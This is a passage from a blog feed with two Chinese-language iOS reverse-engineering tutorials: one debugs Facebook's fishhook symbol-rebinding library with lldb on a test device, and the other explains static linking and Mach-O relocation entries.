mode);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> * argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">      getchar();</span><br><span class="line">    rebind_symbols((struct rebinding[<span class="number">2</span>])&#123;&#123;<span class="string">&quot;close&quot;</span>, my_close, (<span class="keyword">void</span> *)&amp;orig_close&#125;, &#123;<span class="string">&quot;open&quot;</span>, my_open, (<span class="keyword">void</span> *)&amp;orig_open&#125;&#125;, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Open our own binary and print out first 4 bytes (which is the same</span></span><br><span class="line">    <span class="comment">// for all Mach-O binaries on a given architecture)</span></span><br><span class="line">    <span class="keyword">int</span> fd = open(argv[<span class="number">0</span>], O_RDONLY);</span><br><span class="line">    <span class="keyword">uint32_t</span> magic_number = <span class="number">0</span>;</span><br><span class="line">    read(fd, &amp;magic_number, <span class="number">4</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Mach-O Magic Number: %x \\n&quot;</span>, magic_number);</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;%</span><br><span class="line"> ~/study/ios_re_link/fishhook î‚° cat Makefile</span><br><span class="line">all:</span><br><span class="line">    xcrun -sdk iphoneos clang main.c fishhook.c -o main -target arm64-apple-ios12<span class="number">.2</span></span><br><span class="line">    codesign -s <span class="string">&quot;A64593A4DDFA3557CCEFF47FC8E688DCD3E6E455&quot;</span> --entitlements entitlements.xml -f main</span><br><span class="line"></span><br><span class="line">push:</span><br><span class="line">    scp main root@<span class="number">10.2</span><span class="number">.5</span><span class="number">.0</span>:/tmp</span><br><span class="line"></span><br><span class="line">clean:</span><br><span class="line">    rm main</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">* thread #<span class="number">1</span>, <span class="built_in">queue</span> = <span class="string">&#x27;com.apple.main-thread&#x27;</span>, stop reason = step over</span><br><span class="line">    frame #<span class="number">0</span>: <span class="number">0x0000000100a3f6ac</span> main`rebind_symbols_for_image(rebindings=<span class="number">0x00000001012005b0</span>, header=<span class="number">0x0000000100a38000</span>, slide=<span class="number">10715136</span>) at fishhook.c:<span class="number">187</span>:<span class="number">8</span></span><br><span class="line">   <span class="number">184</span>         &#125;</span><br><span class="line">   <span class="number">185</span>       &#125;</span><br><span class="line">   <span class="number">186</span></span><br><span class="line">-&gt; <span class="number">187</span>       <span class="keyword">if</span> (!symtab_cmd || !dysymtab_cmd || !linkedit_segment ||</span><br><span class="line">   <span class="number">188</span>           !dysymtab_cmd-&gt;nindirectsyms) &#123;</span><br><span class="line">   <span class="number">189</span>         <span class="keyword">return</span>;</span><br><span class="line">   <span class="number">190</span>       &#125;</span><br><span class="line">Target <span class="number">0</span>: (main) stopped.</span><br><span class="line">(lldb) po symtab_cmd</span><br><span class="line"><span class="number">0x0000000100a38440</span></span><br><span class="line"></span><br><span class="line">(lldb) po dysymtab_cmd</span><br><span class="line"><span class="number">0x0000000100a38458</span></span><br><span class="line"></span><br><span class="line">(lldb) po linkedit_segment</span><br><span class="line"><span class="number">0x0000000100a383c8</span></span><br><span class="line"></span><br><span class="line">(lldb)</span><br></pre></td></tr></table></figure><p>ç„¶åæ‰¾åˆ° <code>LC_SEGMENT_64_DATA</code> å¤„ç† <code>S_LAZY_SYMBOL_POINTERS</code> å’Œ <code>S_NON_LAZY_SYMBOL_POINTERS</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(lldb) n</span><br><span class="line">Process <span class="number">2046</span> stopped</span><br><span class="line">* thread #<span class="number">1</span>, <span class="built_in">queue</span> = <span class="string">&#x27;com.apple.main-thread&#x27;</span>, stop reason = step over</span><br><span class="line">    frame #<span class="number">0</span>: <span class="number">0x0000000100a3f828</span> main`rebind_symbols_for_image(rebindings=<span class="number">0x00000001012005b0</span>, header=<span class="number">0x0000000100a38000</span>, slide=<span class="number">10715136</span>) at fishhook.c:<span class="number">215</span>:<span class="number">42</span></span><br><span class="line">   <span class="number">212</span>               perform_rebinding_with_section(rebindings, sect, slide, symtab, strtab, indirect_symtab);</span><br><span class="line">   <span class="number">213</span>             &#125;</span><br><span class="line">   <span class="number">214</span>             <span class="keyword">if</span> ((sect-&gt;flags &amp; SECTION_TYPE) == S_NON_LAZY_SYMBOL_POINTERS) &#123;</span><br><span class="line">-&gt; <span class="number">215</span>               perform_rebinding_with_section(rebindings, sect, slide, symtab, strtab, indirect_symtab);</span><br><span class="line">   <span class="number">216</span>             &#125;</span><br><span class="line">   <span class="number">217</span>           &#125;</span><br><span class="line">   <span class="number">218</span>         &#125;</span><br></pre></td></tr></table></figure><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/seg.png" alt="seg"></p><p>è¿™é‡Œä¸ºäº†è°ƒè¯•ï¼Œé‡ç‚¹å…³æ³¨ <code>S_LAZY_SYMBOL_POINTERS</code> çš„å¤„ç†</p><p>é¦–å…ˆåœ¨rebindä¹‹å‰æŸ¥çœ‹openç¬¦å·</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">(lldb) image lookup -va <span class="number">0x0000000100a3fee0</span></span><br><span class="line">      Address: main[<span class="number">0x0000000100007ee0</span>] (main.__TEXT.__stub_helper + <span class="number">180</span>)</span><br><span class="line">      Summary:</span><br><span class="line">       Module: file = <span class="string">&quot;/private/var/tmp/main&quot;</span>, arch = <span class="string">&quot;arm64&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//....</span></span><br><span class="line">Process <span class="number">2046</span> resuming</span><br><span class="line">Process <span class="number">2046</span> stopped</span><br><span class="line">* thread #<span class="number">1</span>, <span class="built_in">queue</span> = <span class="string">&#x27;com.apple.main-thread&#x27;</span>, stop reason = breakpoint <span class="number">4.1</span></span><br><span class="line">    frame #<span class="number">0</span>: <span class="number">0x0000000100a3fbc8</span> main`perform_rebinding_with_section(rebindings=<span class="number">0x00000001012005b0</span>, section=<span class="number">0x0000000100a382d8</span>, slide=<span class="number">10715136</span>, symtab=<span class="number">0x0000000100a44210</span>, strtab=<span class="string">&quot; &quot;</span>, indirect_symtab=<span class="number">0x0000000100a44780</span>) at fishhook.c:<span class="number">135</span>:<span class="number">46</span></span><br><span class="line">   <span class="number">132</span>                 <span class="built_in">strcmp</span>(&amp;symbol_name[<span class="number">1</span>], cur-&gt;rebindings[j].name) == <span class="number">0</span>) &#123;</span><br><span class="line">   <span class="number">133</span>               <span class="keyword">if</span> (cur-&gt;rebindings[j].replaced != <span class="literal">NULL</span> &amp;&amp;</span><br><span class="line">   <span class="number">134</span>                   indirect_symbol_bindings[i] != cur-&gt;rebindings[j].replacement) &#123;</span><br><span class="line">-&gt; <span class="number">135</span>                 *(cur-&gt;rebindings[j].replaced) = indirect_symbol_bindings[i];</span><br><span class="line">   <span class="number">136</span>               &#125;</span><br><span class="line">   <span class="number">137</span>               indirect_symbol_bindings[i] = cur-&gt;rebindings[j].replacement;</span><br><span class="line">   <span class="number">138</span>               <span class="keyword">goto</span> symbol_loop;</span><br><span class="line">Target <span class="number">0</span>: (main) stopped.</span><br><span class="line">(lldb) <span class="function">p <span class="title">symbol_name</span></span></span><br><span class="line"><span class="function"><span class="params">(<span class="keyword">char</span> *)</span> $20 </span>= <span class="number">0x0000000100a44937</span> <span class="string">&quot;_open&quot;</span></span><br><span class="line">(lldb)</span><br></pre></td></tr></table></figure><p>é¦–å…ˆå¤‡ä»½äº†åŸå‡½æ•°åœ°å€ï¼Œç¡®ä¿hookåå¯ä»¥é€šè¿‡ <code>orign_open</code>è°ƒç”¨åˆ°åŸæœ¬çš„å‡½æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(lldb) <span class="function">p <span class="title">i</span></span></span><br><span class="line"><span class="function"><span class="params">(uint)</span> $24 </span>= <span class="number">13</span></span><br><span class="line">(lldb) po indirect_symbol_bindings[<span class="number">13</span>]</span><br><span class="line"><span class="number">0x0000000100a3fee0</span></span><br><span class="line"></span><br><span class="line">(lldb) image lookup -va <span class="number">0x0000000100a3fee0</span></span><br><span class="line">      Address: main[<span class="number">0x0000000100007ee0</span>] (main.__TEXT.__stub_helper + <span class="number">180</span>)</span><br><span class="line">      Summary:</span><br><span class="line">       Module: file = <span class="string">&quot;/private/var/tmp/main&quot;</span>, arch = <span class="string">&quot;arm64&quot;</span></span><br><span class="line"></span><br><span class="line">(lldb)</span><br></pre></td></tr></table></figure><p>ä¹‹åæ‰¾åˆ°å‡½æ•°æŒ‡é’ˆï¼Œå®Œæˆæ›¿æ¢</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">Process 2046 stopped</span><br><span class="line">* thread <span class="comment">#1, queue = &#x27;com.apple.main-thread&#x27;, stop reason = step over</span></span><br><span class="line">    frame <span class="comment">#0: 0x0000000100a3fbfc main`perform_rebinding_with_section(rebindings=0x00000001012005b0, section=0x0000000100a382d8, slide=10715136, symtab=0x0000000100a44210, strtab=&quot; &quot;, indirect_symtab=0x0000000100a44780) at fishhook.c:137:41</span></span><br><span class="line">   134                   indirect_symbol_bindings[i] != cur-&gt;rebindings[j].replacement) &#123;</span><br><span class="line">   135                 *(cur-&gt;rebindings[j].replaced) = indirect_symbol_bindings[i];</span><br><span class="line">   136               &#125;</span><br><span class="line">-&gt; 137               indirect_symbol_bindings[i] = cur-&gt;rebindings[j].replacement;</span><br><span class="line">   138               goto symbol_loop;</span><br><span class="line">   139             &#125;</span><br><span class="line">   140           &#125;</span><br><span class="line">Target 0: (main) stopped.</span><br><span class="line">(lldb) image list |grep main</span><br><span class="line">[  0] EAE1AE51-465A-32E0-8B3F-195FE2480F4F 0x0000000100a38000 /private/var/tmp/main</span><br><span class="line">      /System/Volumes/Data/Users/muhe/study/ios_re_link/fishhook/main.dSYM/Contents/Resources/DWARF/main(0x0000000100a38000)</span><br><span class="line">(lldb)</span><br><span class="line">(lldb) x/20gx indirect_symbol_bindings</span><br><span class="line">0x100a40018: 0x00000001d8642a68 0x0000000100a3fe50</span><br><span class="line">0x100a40028: 0x0000000100a3fe5c 0x0000000100a3fe68</span><br><span class="line">0x100a40038: 0x0000000100a3fe74 0x00000001d8581374</span><br><span class="line">0x100a40048: 0x0000000100a3f224 0x00000001d8581694</span><br><span class="line">0x100a40058: 0x0000000100a3fea4 0x00000001d860ae30</span><br><span class="line">0x100a40068: 0x00000001d871060c 0x00000001d873dd30</span><br><span class="line">0x100a40078: 0x0000000100a3fed4 0x0000000100a3f270</span><br><span class="line">0x100a40088: 0x0000000100a3feec 0x0000000100a3fef8</span><br><span class="line">0x100a40098: 0x00000001d873dfd0 0x0000000100a3ff10</span><br><span class="line">0x100a400a8: 0x0000000100d04498 0x0000000100a3ff72</span><br><span class="line">(lldb) x/gx 0x100a40078+8</span><br><span class="line">0x100a40080: 0x0000000100a3f270</span><br><span class="line">(lldb)</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">&gt;&gt;&gt; hex(0x100a40080-0x0000000100a38000)</span><br><span class="line"><span class="string">&#x27;0x8080&#x27;</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/func_ptr.png" alt="func_ptr"></p><p>å¦‚æœè°ƒç”¨ åŸæœ¬çš„å‡½æ•°ä¼šèµ°ä»€ä¹ˆæµç¨‹ï¼Ÿ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x100a3f448</span> &lt;+<span class="number">176</span>&gt;: bl     <span class="number">0x100a3fd9c</span>               ; symbol stub <span class="keyword">for</span>: close</span><br><span class="line">-&gt;  <span class="number">0x100a3f44c</span> &lt;+<span class="number">180</span>&gt;: adrp   x8, <span class="number">1</span></span><br><span class="line">    <span class="number">0x100a3f450</span> &lt;+<span class="number">184</span>&gt;: ldr    x8, [x8]</span><br><span class="line">    <span class="number">0x100a3f454</span> &lt;+<span class="number">188</span>&gt;: ldr    x8, [x8]</span><br><span class="line">    <span class="number">0x100a3f458</span> &lt;+<span class="number">192</span>&gt;: ldur   x10, [x29, #<span class="number">-0x8</span>]</span><br><span class="line">    <span class="number">0x100a3f45c</span> &lt;+<span class="number">196</span>&gt;: subs   x8, x8, x10</span><br><span class="line">    <span class="number">0x100a3f460</span> &lt;+<span class="number">200</span>&gt;: b.ne   <span class="number">0x100a3f478</span>               ; &lt;+<span class="number">224</span>&gt; at main.c</span><br><span class="line">    <span class="number">0x100a3f464</span> &lt;+<span class="number">204</span>&gt;: mov    w8, #<span class="number">0x0</span></span><br><span class="line">    <span class="number">0x100a3f468</span> &lt;+<span class="number">208</span>&gt;: mov    x0, x8</span><br><span class="line">    <span class="number">0x100a3f46c</span> &lt;+<span class="number">212</span>&gt;: ldp    x29, x30, [sp, #<span class="number">0x70</span>]</span><br><span class="line">    <span class="number">0x100a3f470</span> &lt;+<span class="number">216</span>&gt;: add    sp, sp, #<span class="number">0x80</span>             ; =<span class="number">0x80</span></span><br><span class="line">    <span class="number">0x100a3f474</span> &lt;+<span class="number">220</span>&gt;: ret</span><br><span class="line">    <span class="number">0x100a3f478</span> &lt;+<span class="number">224</span>&gt;: bl     <span class="number">0x100a3fd60</span>               ; symbol stub <span class="keyword">for</span>: __stack_chk_fail</span><br><span class="line">(lldb) dis -a <span class="number">0x100a3fd9c</span></span><br><span class="line">main`close:</span><br><span class="line">    <span class="number">0x100a3fd9c</span> &lt;+<span class="number">0</span>&gt;: nop</span><br><span class="line">    <span class="number">0x100a3fda0</span> &lt;+<span class="number">4</span>&gt;: ldr    x16, #<span class="number">0x2a8</span>               ; (<span class="keyword">void</span> *)<span class="number">0x0000000100a3f224</span>: my_close at /Users/muhe/study/ios_re_link/fishhook/main.c:<span class="number">10</span></span><br><span class="line">    <span class="number">0x100a3fda4</span> &lt;+<span class="number">8</span>&gt;: br     x16</span><br></pre></td></tr></table></figure><h1 id="å¼•ç”¨"><a href="#å¼•ç”¨" class="headerlink" title="å¼•ç”¨"></a>å¼•ç”¨</h1><p><a href="https://github.com/facebook/fishhook">https://github.com/facebook/fishhook</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å…³äº&quot;&gt;&lt;a href=&quot;#å…³äº&quot; class=&quot;headerlink&quot; title=&quot;å…³äº&quot;&gt;&lt;/a&gt;å…³äº&lt;/h1&gt;&lt;p&gt;Fishhookæ˜¯Facebookæä¾›çš„åˆ©ç”¨MachOæ–‡ä»¶æƒ°æ€§åŠ è½½åŸç†ï¼Œé€šè¿‡ä¿®æ”¹æ‡’åŠ è½½å’Œéæ‡’åŠ è½½ä¸¤ä¸ªè¡¨çš„æŒ‡é’ˆè¾¾åˆ°Cå‡½æ•°HOOKçš„ç›®çš„ä¸€ä¸ªè½»é‡çº§çš„hookåº“ã€‚ç†è§£è¿™ä¸ªå·¥å…·å’Œç†Ÿæ‚‰æµç¨‹ä¹Ÿæ˜¯å¯ä»¥å¸®åŠ©æ›´å¥½çš„ç†è§£MachOæ–‡ä»¶æ ¼å¼ :)&lt;/p&gt;</summary>
    
    
    
    
    <category term="RE" scheme="https://o0xmuhe.github.io/tags/RE/"/>
    
    <category term="iOS" scheme="https://o0xmuhe.github.io/tags/iOS/"/>
    
    <category term="fishhook" scheme="https://o0xmuhe.github.io/tags/fishhook/"/>
    
  </entry>
  
  <entry>
    <title>iOS RE 4 beginners 2 - é™æ€é“¾æ¥&amp;&amp;åŠ¨æ€é“¾æ¥</title>
    <link href="https://o0xmuhe.github.io/2021/07/14/iOS-RE-4-beginners-2/"/>
    <id>https://o0xmuhe.github.io/2021/07/14/iOS-RE-4-beginners-2/</id>
    <published>2021-07-14T09:15:47.000Z</published>
    <updated>2021-07-20T08:08:05.162Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ENV"><a href="#ENV" class="headerlink" title="ENV"></a>ENV</h1><p>macos11.4 + iphone6 iOS 12.2</p><a id="more"></a><h1 id="é™æ€é“¾æ¥"><a href="#é™æ€é“¾æ¥" class="headerlink" title="é™æ€é“¾æ¥"></a>é™æ€é“¾æ¥</h1><p>é™æ€é“¾æ¥ï¼šè¾“å…¥å¤šä¸ªç›®æ ‡æ–‡ä»¶ï¼Œè¾“å‡ºä¸€ä¸ªæ–‡ä»¶ï¼ˆä¸€èˆ¬æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ï¼‰ã€‚è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼ŒæŠŠå¤šä¸ªç›®æ ‡æ–‡ä»¶é‡Œç›¸åŒæ€§è´¨çš„æ®µåˆå¹¶åˆ°ä¸€èµ·ã€‚</p><h2 id="è¿‡ç¨‹"><a href="#è¿‡ç¨‹" class="headerlink" title="è¿‡ç¨‹"></a>è¿‡ç¨‹</h2><ul><li>åœ°å€å’Œç©ºé—´åˆ†é… (Address and Storage Allocation)</li><li>ç¬¦å·å†³è®® (Symbol Resolution) / ç¬¦å·ç»‘å®š (Symbol Binding)</li><li>é‡å®šä½ (Relocation)</li></ul><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled.png" alt="%E9%93%BE%E6%8E%A5%E4%B8%8Edyld%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B%E4%BB%A5%E5%8F%8Afishhook%E5%8E%9F%E7%90%86%20notes%20ae172b61c1044420a207538366c9d075/Untitled.png"></p><h2 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">~/study/ios_re_link/static_link î‚° cat main.c</span><br><span class="line"></span><br><span class="line">extern int global_var;</span><br><span class="line"></span><br><span class="line">int foo(int i);</span><br><span class="line"></span><br><span class="line">int main(void)&#123;</span><br><span class="line"></span><br><span class="line">    int ret = foo(42 + global_var);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line"> ~/study/ios_re_link/static_link î‚° cat foo.c</span><br><span class="line">int global_var = 0x1337;</span><br><span class="line"></span><br><span class="line">int foo(int i)&#123;</span><br><span class="line">    <span class="built_in">return</span> i + global_var;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~/study/ios_re_link/static_link î‚° xcrun -sdk iphoneos clang -c main.c foo.c -target arm64-apple-ios12.2</span><br><span class="line">~/study/ios_re_link/static_link î‚° xcrun -sdk iphoneos clang main.o foo.o -o main -target arm64-apple-ios12.2</span><br></pre></td></tr></table></figure><p>ä¸¤ä¸ªæ¨¡å—(main.o å’Œ foo.o) é€šè¿‡é™æ€é“¾æ¥ç»„åˆæˆäº†ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶(main)</p><h2 id="æ¨¡å—-amp-amp-äº§ç‰©"><a href="#æ¨¡å—-amp-amp-äº§ç‰©" class="headerlink" title="æ¨¡å—&amp;&amp;äº§ç‰©"></a>æ¨¡å—&amp;&amp;äº§ç‰©</h2><h3 id="main-o"><a href="#main-o" class="headerlink" title="main.o"></a>main.o</h3><p>é€šè¿‡machoviewå¯ä»¥çœ‹åˆ°é‡å®šä½æ®µæœ‰ä¸‰æ¡ä¿¡æ¯ï¼Œæ„å‘³ç€ç¨‹åºä¸­æœ‰ä¸‰å¤„éœ€è¦é‡å®šä½å¤„ç†ï¼š</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%201.png" alt="%E9%93%BE%E6%8E%A5%E4%B8%8Edyld%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B%E4%BB%A5%E5%8F%8Afishhook%E5%8E%9F%E7%90%86%20notes%20ae172b61c1044420a207538366c9d075/Untitled%201.png"></p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%202.png" alt="%E9%93%BE%E6%8E%A5%E4%B8%8Edyld%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B%E4%BB%A5%E5%8F%8Afishhook%E5%8E%9F%E7%90%86%20notes%20ae172b61c1044420a207538366c9d075/Untitled%202.png"></p><p>è¿™ä¸ªå›¾æ˜¯hopperåæ±‡ç¼–çš„mainå‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°å¯¹äºå¼•ç”¨åˆ°å…¶ä»–æ¨¡å—(foo.o)é‡çš„å˜é‡/å‡½æ•°çš„åœ°æ–¹çœ‹èµ·æ¥â€œæ­£å¸¸â€ï¼Œä½†æ˜¯ç‚¹å‡» <code>bl _foo</code> å°±ä¼šå‘ç°è·³è½¬åˆ°äº†ï¼š</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%203.png" alt="%E9%93%BE%E6%8E%A5%E4%B8%8Edyld%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B%E4%BB%A5%E5%8F%8Afishhook%E5%8E%9F%E7%90%86%20notes%20ae172b61c1044420a207538366c9d075/Untitled%203.png"></p><p>æ ¹æ®&lt;macho/reloc.h&gt;çš„å®šä¹‰ï¼Œå¯ä»¥çœ‹åˆ°relocæ®µçš„ç»“æ„ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">struct relocation_info &#123;</span><br><span class="line">   int32_t    r_address;    /* offset <span class="keyword">in</span> the section to what is being</span><br><span class="line">                   relocated */</span><br><span class="line">   uint32_t     r_symbolnum:24,    /* symbol index <span class="keyword">if</span> r_extern == 1 or section</span><br><span class="line">                   ordinal <span class="keyword">if</span> r_extern == 0 */</span><br><span class="line">        r_pcrel:1,     /* was relocated pc relative already */</span><br><span class="line">        r_length:2,    /* 0=byte, 1=word, 2=long, 3=quad */</span><br><span class="line">        r_extern:1,    /* does not include value of sym referenced */</span><br><span class="line">        r_type:4;    /* <span class="keyword">if</span> not 0, machine specific relocation <span class="built_in">type</span> */</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>ç»“åˆä¸Šé¢çš„å›¾æ¥çœ‹(ä»¥_fooç¬¦å·ä¸ºä¾‹)ï¼š</p><ul><li>r_address : 0x28</li><li>r_symbolnum(24bits): æŒ‡å‘_foo å­—ç¬¦ä¸²</li><li>å‰©ä¸‹çš„8bitsæ˜¯æ ‡å¿—ä½</li></ul><p>å¯¹åº”åˆ°æ±‡ç¼–é‡Œå°±æ˜¯ï¼Œmainå‡½æ•°çš„0x28è¡Œå¼•ç”¨äº† _foo ç¬¦å·ï¼Œrelocæ®µæŠŠè¿™ä¸ªä¿¡æ¯å‘ŠçŸ¥linkerï¼Œè¿™æ ·åœ¨é“¾æ¥çš„æ—¶å€™linkerå°±ä¼šå¤„ç†è¿™æ¡ä¿¡æ¯ï¼ŒæŠŠå¯¹åº”çš„ç¬¦å·åšæ›¿æ¢å¤„ç†ã€‚</p><h3 id="foo-o"><a href="#foo-o" class="headerlink" title="foo.o"></a>foo.o</h3><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%204.png" alt="%E9%93%BE%E6%8E%A5%E4%B8%8Edyld%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B%E4%BB%A5%E5%8F%8Afishhook%E5%8E%9F%E7%90%86%20notes%20ae172b61c1044420a207538366c9d075/Untitled%204.png"></p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%205.png" alt="%E9%93%BE%E6%8E%A5%E4%B8%8Edyld%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B%E4%BB%A5%E5%8F%8Afishhook%E5%8E%9F%E7%90%86%20notes%20ae172b61c1044420a207538366c9d075/Untitled%205.png"></p><p>å…¶å®éƒ½æ˜¯å¯¹ <code>global_var</code>çš„å¼•ç”¨</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%206.png" alt="%E9%93%BE%E6%8E%A5%E4%B8%8Edyld%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B%E4%BB%A5%E5%8F%8Afishhook%E5%8E%9F%E7%90%86%20notes%20ae172b61c1044420a207538366c9d075/Untitled%206.png"></p><p>åœ¨foo.oæ¨¡å—ä¸­ï¼Œæ˜¯ 0x20å¤„çš„dataï¼Œè¿™ä¸ªä¿¡æ¯ä¹Ÿè¦å‘Šè¯‰linkerï¼Œåœ¨linkçš„é˜¶æ®µåšæ›¿æ¢ã€‚</p><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><p>æœ€ç»ˆçš„å¯æ‰§è¡Œæ–‡ä»¶mainï¼Œå¯ä»¥çœ‹åˆ°æ²¡æœ‰é‡å®šä½ä¿¡æ¯ï¼Œè€Œä¸”mianå’Œfooå‡½æ•°ä¸­æ”¹æ›¿æ¢çš„ç¬¦å·éƒ½å·²ç»å®Œæˆäº†æ›¿æ¢ï¼Œå¯ä»¥é¡ºåˆ©çš„ç´¢å¼•åˆ°æƒ³è¦ä½¿ç”¨çš„ç¬¦å·(fooå’Œglobal_var)ã€‚</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%207.png" alt="%E9%93%BE%E6%8E%A5%E4%B8%8Edyld%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B%E4%BB%A5%E5%8F%8Afishhook%E5%8E%9F%E7%90%86%20notes%20ae172b61c1044420a207538366c9d075/Untitled%207.png"></p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%208.png" alt="%E9%93%BE%E6%8E%A5%E4%B8%8Edyld%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B%E4%BB%A5%E5%8F%8Afishhook%E5%8E%9F%E7%90%86%20notes%20ae172b61c1044420a207538366c9d075/Untitled%208.png"></p><p>å¯¹æ¯”ä¸¤è€…ç¬¦å·è¡¨ï¼š</p><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/Untitled%209.png" 